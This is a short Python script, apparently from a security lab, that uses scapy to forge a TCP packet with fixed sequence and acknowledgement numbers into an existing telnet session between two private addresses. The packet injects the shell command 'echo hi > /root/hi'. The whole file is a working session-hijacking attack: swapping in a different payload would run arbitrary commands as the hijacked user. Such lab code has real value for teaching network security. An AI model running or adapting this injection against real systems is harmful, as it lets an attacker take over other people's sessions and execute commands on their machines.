#!/usr/bin/env python3
from scapy.all import *
ip = IP(src="10.9.0.6", dst="10.9.0.5")
tcp = TCP(sport=42974, dport=23, flags="PA", seq=3278233498, ack=3935403859)
data = "\n echo hi > /root/hi \n"
pkt = ip/tcp/data
ls(pkt)
send(pkt,verbose=0)